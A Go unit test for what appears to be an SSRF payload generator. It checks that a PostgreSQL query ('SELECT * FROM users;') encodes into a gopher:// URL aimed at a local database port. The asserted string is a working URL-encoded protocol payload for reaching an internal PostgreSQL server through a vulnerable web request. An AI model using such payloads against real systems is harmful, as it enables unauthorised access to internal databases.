package postgresql

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestPayload(t *testing.T) {
	my := NewPostgreSQL(func(o *Options) {
		o.Query = "SELECT * FROM users;"
		o.DB = "test"
	})

	assert.Equal(t, "gopher://127.0.0.1:5432/_%00%00%00%25%00%03%00%00%75%73%65%72%00%70%6f%73%74%67%72%65%73%00%64%61%74%61%62%61%73%65%00%74%65%73%74%00%00%51%00%00%00%19%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%75%73%65%72%73%3b%00%58%00%00%00%04", my.Payload())
}
